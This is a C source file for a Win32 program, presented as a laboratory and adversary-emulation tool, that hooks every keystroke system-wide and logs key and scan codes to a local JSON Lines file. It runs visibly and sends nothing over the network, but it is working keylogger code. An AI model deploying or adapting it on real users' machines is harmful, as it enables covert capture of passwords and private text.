/*
 * KeyLogix — Win32 Low-Level Keyboard Observer (Laboratory Capture)
 *
 * Research and laboratory use only.
 * Captures raw WH_KEYBOARD_LL observations into JSON Lines format.
 * Always chains CallNextHookEx and remains visible in console.
 */

#ifdef _WIN32
#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <objbase.h>
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <stdint.h>

#ifdef _WIN32

static HHOOK g_hook = NULL;
static FILE *g_out_file = NULL;
static char g_session_id[128] = "00000000-0000-0000-0000-000000000000";
static uint32_t g_sequence = 0;
static volatile BOOL g_running = TRUE;

static void generate_uuid(char *out, size_t max_len) {
    GUID guid;
    if (CoCreateGuid(&guid) == S_OK) {
        snprintf(out, max_len,
            "%08lx-%04x-%04x-%02x%02x-%02x%02x%02x%02x%02x%02x",
            (unsigned long)guid.Data1, (unsigned int)guid.Data2, (unsigned int)guid.Data3,
            guid.Data4[0], guid.Data4[1], guid.Data4[2], guid.Data4[3],
            guid.Data4[4], guid.Data4[5], guid.Data4[6], guid.Data4[7]);
    } else {
        snprintf(out, max_len, "uuid-%u-%u", (unsigned)GetTickCount(), (unsigned)rand());
    }
}

static void get_iso_timestamp(char *out, size_t max_len) {
    SYSTEMTIME st;
    GetSystemTime(&st);
    snprintf(out, max_len, "%04d-%02d-%02dT%02d:%02d:%02d.%03d000Z",
        st.wYear, st.wMonth, st.wDay,
        st.wHour, st.wMinute, st.wSecond,
        st.wMilliseconds);
}

static BOOL WINAPI ConsoleCtrlHandler(DWORD signal) {
    if (signal == CTRL_C_EVENT || signal == CTRL_BREAK_EVENT || signal == CTRL_CLOSE_EVENT) {
        fprintf(stderr, "\n[!] Shutting down observer...\n");
        g_running = FALSE;
        PostQuitMessage(0);
        return TRUE;
    }
    return FALSE;
}

static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && g_out_file != NULL) {
        KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
        const char *raw_type = "WM_KEYDOWN";
        if (wParam == WM_KEYUP) raw_type = "WM_KEYUP";
        else if (wParam == WM_SYSKEYDOWN) raw_type = "WM_SYSKEYDOWN";
        else if (wParam == WM_SYSKEYUP) raw_type = "WM_SYSKEYUP";

        char event_id[128];
        generate_uuid(event_id, sizeof(event_id));

        char timestamp[64];
        get_iso_timestamp(timestamp, sizeof(timestamp));

        uint64_t mono_ns = (uint64_t)p->time * 1000000ULL;

        fprintf(g_out_file,
            "{\"schema\":\"keylogix.raw_observation.v1\","
            "\"event_id\":\"%s\","
            "\"timestamp\":\"%s\","
            "\"event_type\":\"\","
            "\"key_code\":%lu,"
            "\"key_label\":{\"presence\":\"unavailable\",\"value\":null,\"obtained_via\":null},"
            "\"modifier_state\":{\"alt\":false,\"ctrl\":false,\"encoding\":0,\"known\":false,\"origin\":\"unknown\",\"shift\":false,\"win\":false},"
            "\"application\":{\"presence\":\"unavailable\",\"value\":null,\"obtained_via\":null},"
            "\"window_title\":{\"presence\":\"unavailable\",\"value\":null,\"obtained_via\":null},"
            "\"session_id\":\"%s\","
            "\"source\":\"win32_llhook\","
            "\"monotonic_ns\":%llu,"
            "\"clock_source\":\"win32_filetime_utc+kbdll_tickms\","
            "\"event_type_raw\":\"%s\","
            "\"scan_code\":%lu,"
            "\"flags\":%lu,"
            "\"extra_info\":%lu,"
            "\"tick_ms\":%lu,"
            "\"sequence\":%lu,"
            "\"provenance\":{\"information_kind\":\"raw_observation\",\"transform\":\"observe\",\"parent_ids\":[],\"ingested_via\":null,\"notes\":\"\"}}\n",
            event_id, timestamp, (unsigned long)p->vkCode,
            g_session_id, (unsigned long long)mono_ns,
            raw_type, (unsigned long)p->scanCode, (unsigned long)p->flags,
            (unsigned long)p->dwExtraInfo, (unsigned long)p->time,
            (unsigned long)g_sequence++);
        fflush(g_out_file);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main(int argc, char **argv) {
    const char *out_path = "raw.jsonl";
    int duration_ms = 0;

    fprintf(stderr, "================================================================\n");
    fprintf(stderr, " KeyLogix — Win32 Low-Level Keyboard Observer (Laboratory)\n");
    fprintf(stderr, " RESEARCH AND ADVERSARY-EMULATION LAB USE ONLY\n");
    fprintf(stderr, "================================================================\n");

    for (int i = 1; i < argc; ++i) {
        if (strcmp(argv[i], "--output") == 0 && i + 1 < argc) {
            out_path = argv[++i];
        } else if (strcmp(argv[i], "--session") == 0 && i + 1 < argc) {
            strncpy(g_session_id, argv[++i], sizeof(g_session_id) - 1);
        } else if (strcmp(argv[i], "--duration-ms") == 0 && i + 1 < argc) {
            duration_ms = atoi(argv[++i]);
        }
    }

    g_out_file = fopen(out_path, "a");
    if (!g_out_file) {
        fprintf(stderr, "[-] Error: Unable to open output file: %s\n", out_path);
        return 1;
    }

    SetConsoleCtrlHandler(ConsoleCtrlHandler, TRUE);

    HINSTANCE hInst = GetModuleHandle(NULL);
    g_hook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, hInst, 0);
    if (!g_hook) {
        DWORD err = GetLastError();
        fprintf(stderr, "[-] Error: SetWindowsHookExW failed with code %lu\n", err);
        fclose(g_out_file);
        return 2;
    }

    fprintf(stderr, "[+] Observer active. Session: %s\n", g_session_id);
    fprintf(stderr, "[+] Writing observations to: %s\n", out_path);
    if (duration_ms > 0) {
        fprintf(stderr, "[+] Duration limit: %d ms\n", duration_ms);
        SetTimer(NULL, 1, (UINT)duration_ms, NULL);
    }
    fprintf(stderr, "[*] Press Ctrl+C to stop.\n");

    MSG msg;
    DWORD start_tick = GetTickCount();
    while (g_running && GetMessage(&msg, NULL, 0, 0)) {
        if (msg.message == WM_TIMER) {
            fprintf(stderr, "[*] Duration elapsed.\n");
            break;
        }
        if (duration_ms > 0 && (GetTickCount() - start_tick) >= (DWORD)duration_ms) {
            fprintf(stderr, "[*] Duration elapsed.\n");
            break;
        }
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    if (g_hook) {
        UnhookWindowsHookEx(g_hook);
        g_hook = NULL;
    }
    if (g_out_file) {
        fclose(g_out_file);
        g_out_file = NULL;
    }

    fprintf(stderr, "[+] Observer stopped. Total events recorded: %lu\n", (unsigned long)g_sequence);
    return 0;
}

#else

int main(void) {
    fprintf(stderr, "[-] Win32 observer cannot run natively on non-Windows platforms.\n");
    return 1;
}

#endif
